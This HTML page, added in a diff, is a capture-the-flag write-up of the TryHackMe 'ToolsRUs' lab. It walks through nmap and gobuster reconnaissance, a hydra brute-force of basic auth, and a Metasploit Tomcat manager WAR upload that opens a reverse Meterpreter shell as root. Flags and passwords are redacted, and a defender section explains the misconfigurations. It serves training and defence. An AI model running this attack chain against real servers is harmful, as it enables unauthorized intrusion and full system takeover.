@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ToolsRUs | JackHacksStuff</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="room-easy">
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="auth"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="tomcat"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="exploit"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="flag"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="verdict"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Easy</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge easy">Easy</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · Linux · Web · Tomcat · Default Creds → RCE</div>
+    <h1 class="wu-title">ToolsRUs</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-09-29</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent easy">Easy</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">1</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">gobuster</span>
+    <span class="tool-tag">hydra</span>
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">nikto</span>
+    <span class="tool-tag">metasploit</span>
+    <span class="tool-tag">tomcat_mgr_upload</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>ToolsRUs</strong> is a beginner-friendly Linux box that walks the classic kill chain end to end: directory brute-forcing, HTTP basic-auth cracking, service fingerprinting, and then a well-known Tomcat manager exploit to land a shell. It's built for people who've used the tools a little and want to chain them together in anger. The real story here isn't the exploit, it's that <strong>Tomcat was running as root</strong>, which turns a low-privilege web compromise straight into a full system takeover.</p>
+    <p><a href="https://tryhackme.com/room/toolsrus" target="_blank">View room on TryHackMe →</a></p>
+    <p><em>Flags and puzzle answers have been redacted per TryHackMe's write-up policy. Technique and tooling are shown in full.</em></p>
+
+    <h2 id="recon">// Reconnaissance</h2>
+
+    <h3>Port and Service Discovery</h3>
+    <p>A full TCP sweep with version detection surfaces four services. Nothing exotic, but note the second HTTP service on <code>1234</code>, that's the interesting one.</p>
+
+    <pre>$ nmap -p- -sV &lt;target_ip&gt;
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)</pre>
+
+    <h3>Directory Enumeration</h3>
+    <p>A wordlist run against port 80 turns up two useful paths. <code>/guidelines</code> redirects (301) and <code>/protected</code> returns 401, basic auth.</p>
+
+    <pre>$ gobuster dir -u http://&lt;target_ip&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+/guidelines   (Status: 301) [--> http://&lt;target_ip&gt;/guidelines/]
+/protected    (Status: 401)</pre>
+
+    <p>Browsing <code>/guidelines/</code> turns up a note in the page content that does two jobs at once: it names the user, and it name-drops the service we'll be attacking next:</p>
+
+    <div class="note">
+      <strong>Hey bob, did you update that TomCat server?</strong>
+    </div>
+
+    <p>That's <strong>bob</strong> for Q2, and a pointer to the second web service on port 1234. The protected directory, it turns out, belongs to him.</p>
+
+    <h2 id="auth">// Cracking Basic Auth</h2>
+
+    <p>HTTP basic auth is just a base64-encoded <code>user:pass</code> in the <code>Authorization</code> header, so it's a straightforward online brute-force target. Hydra's <code>http-get</code> module handles the 401 challenge/response cycle for us:</p>
+
+    <pre>$ hydra -l bob -P /usr/share/wordlists/rockyou.txt &lt;target_ip&gt; http-get /protected
+
+[80][http-get] host: &lt;target_ip&gt;   login: bob   password: [redacted]</pre>
+
+    <p>Weak password, small wordlist, done in ~20 seconds. The lesson: basic auth with a dictionary password is essentially unauthenticated.</p>
+
+    <h2 id="tomcat">// Fingerprinting Tomcat</h2>
+
+    <p>Port 1234 is a Tomcat manager interface. Nikto, given the credentials we just found, confirms it and reports its findings, including the <code>Server</code> header, which answers the version questions directly:</p>
+
+    <pre>$ nikto -h http://&lt;target_ip&gt;:1234/manager/html -id bob:&lt;password&gt;
+
++ Server: Apache-Coyote/1.1
++ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
++ /manager/html/manager/html: Default Tomcat Manager interface found
++ /manager/html/WorkArea/version.xml: Ektron CMS version information</pre>
+
+    <p><strong>Server:</strong> Apache-Coyote/1.1, i.e. Tomcat's Coyote JSP engine, version 1.1. The exposed manager interface plus working credentials is the whole attack surface: the manager can deploy WAR files, and a deployed WAR gives remote code execution.</p>
+
+    <div class="note">
+      <strong>A note on the room's questions:</strong> one of the prompts in this room is truncated on the THM side ("How many docume0…"). The accepted answer doesn't cleanly map to anything in current Nikto output, it looks like a legacy artefact from an older Nikto version. I brute-forced it manually and moved on. Worth flagging rather than pretending it made sense.
+    </div>
+
+    <h2 id="exploit">// Exploitation: Tomcat Manager → Shell</h2>
+
+    <p>Metasploit ships a module that does exactly this: authenticate to the manager, deploy a malicious WAR, trigger it, then clean up (undeploy) behind itself. All we supply is the target, port, and the credentials we recovered.</p>
+
+    <pre>$ msfconsole
+msf6 &gt; use exploit/multi/http/tomcat_mgr_upload
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RHOSTS &lt;target_ip&gt;
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RPORT 1234
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername bob
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword &lt;password&gt;
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set LHOST &lt;tun0_ip&gt;
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set LPORT 4444
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run</pre>
+
+    <p>Output, trimmed:</p>
+
+    <pre>[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying ...
+[*] Executing ...
+[*] Undeploying ...
+[*] Meterpreter session 1 opened (... -&gt; ...)</pre>
+
+    <div class="note">
+      <strong>Why this works:</strong> the Tomcat manager is an administrative deploy endpoint. Anyone who can authenticate to it can upload a WAR, and a WAR is just a JSP payload with a servlet wrapper. No memory corruption, no weird gadget chain, the feature <em>is</em> the vulnerability. This is why exposing the manager interface to the internet is a classic real-world finding.
+    </div>
+
+    <h2 id="flag">// Finding the Flag (and Why No Privesc)</h2>
+
+    <p>Dropping to a shell and asking who we are is the fastest way to find out how badly the service was configured:</p>
+
+    <pre>meterpreter &gt; shell
+$ whoami
+root</pre>
+
+    <p>That's the punchline. Tomcat was started as <strong>root</strong>, so the web-facing RCE <em>is</em> a root RCE. No privilege escalation required, we're already at the top of the tree. The flag lives in <code>/root</code>:</p>
+
+    <pre>$ ls /root
+flag.txt  snap
+
+$ cat /root/flag.txt
+[redacted]</pre>
+
+    <p>Shell, flag, done. But that's the least interesting part of the box.</p>
+
+    <h3>What a Defender Takes From This</h3>
+    <p>Three misconfigurations stack up to make this box trivially rootable, and all three are common in the wild:</p>
+    <ul>
+      <li><strong>Tomcat running as root.</strong> A web service should run as a dedicated low-privilege user. Had it, the exploit would have landed a shell as <code>tomcat</code> and the box would have required real privesc.</li>
+      <li><strong>Basic auth over plain HTTP.</strong> Credentials travel base64-encoded, which is encoding, not encryption. A weak password plus a dictionary makes the crack near-instant.</li>
+      <li><strong>Manager interface exposed on a non-standard port.</strong> Moving Tomcat to 1234 doesn't hide it; it just means a full port scan finds it instead of a top-1000 one. Security by obscurity isn't.</li>
+    </ul>
+
+    <h2 id="verdict">// Verdict</h2>
+    <p>ToolsRUs is a solid first "chain everything together" box. Individually each step is easy, but the value is in doing them in sequence and reading each output to decide the next move. The Q8 truncation is an annoyance, and the fact that no privesc is needed makes the ending feel a little anticlimactic. That said, the "Tomcat as root" misconfiguration is a genuinely good teaching moment: it's the kind of thing you'll flag in a real pentest report, and it's more interesting than the shell itself.</p>
+    <p style="color: var(--text); font-size: 0.8rem;">
+      <span style="color: var(--room-accent, var(--accent));">→</span> 6/10 — a good methodology drill; the defensive lesson outshines the exploit.
+    </p>
+
+  </div>
+
+  <div class="wu-footer">
+    <a href="stuxctf.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">StuxCTF</span>
+    </a>
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+  </div>
+
+</main>
+
+<script src="../js/script.js"></script>
+
+</body>
+</html>
